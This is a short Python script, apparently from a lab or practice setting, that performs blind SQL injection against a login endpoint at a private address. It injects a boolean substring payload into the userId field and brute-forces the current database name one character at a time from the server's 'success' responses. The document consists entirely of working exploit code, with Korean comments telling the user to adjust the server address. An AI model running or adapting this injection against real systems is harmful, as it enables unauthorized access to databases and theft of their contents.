import requests

result = ""
for i in range(1,9):
    for j in range(97,122):
        id = f"'or ascii(substring(current_database(),{i},1))={j}--"
        # 서버 주소와 포트에 맞게 수정
        url = 'http://192.168.64.1:1204/users/signin'
        data = {
            'userId': id,
            'password': 'hello1'
        }

        try:
            response = requests.post(url, json=data)
            if('success' in response.text):
                print(chr(j))
                result += chr(j)
                break

        except Exception as e:
            print('요청 중 오류 발생:', e)
print("db 이름 : "+result)
